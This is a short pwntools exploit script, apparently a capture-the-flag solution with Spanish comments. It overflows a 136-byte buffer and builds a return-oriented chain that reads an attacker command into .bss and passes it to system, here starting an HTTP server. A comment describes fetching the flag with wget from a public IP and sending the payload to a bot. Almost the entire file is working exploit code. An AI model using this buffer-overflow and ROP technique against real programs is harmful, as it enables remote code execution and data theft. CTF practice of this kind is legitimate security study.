from pwn import *
import struct

#### ADDRESS Y GADGETS ####
main = 0x000000000040059e
retmain = 0x4005b5
poprdi = 0x40061b
system = 0x400470
dynamic = 0x600e20
bss = 0x601040
poprsir15 = 0x0000000000400619
gets = 0x0000000000400480

#### COMANDO A EJECUTAR ####
#* para levanar uns erver y rapidamente hacer un
#* wget http://172.104.234.7/flag.txt
#* quizas se podria haber automatizado, pero bueno, en ctf todo vale
command = 'python -m SimpleHTTPServer 8000'

#### PRIMER PAYLOAD ####
payload = command
payload += "A" * (136 - len(command))
payload += struct.pack("<Q",poprdi)
payload += struct.pack("<Q",bss)
payload += struct.pack("<Q",gets)
#payload += struct.pack("<Q",main)
payload += struct.pack("<Q",poprdi)
payload += struct.pack("<Q",bss)
payload += struct.pack("<Q",system)
print payload

#### SEGUNDO PAYLOAD ####
print command
#exploit = "A" * 136
#exploit += struct.pack("<Q",poprdi)
#exploit += struct.pack("<Q",bss)
#exploit += struct.pack("<Q",system)
#print exploit

### Finalmente subir el payload a una IP publica y llamar al bot!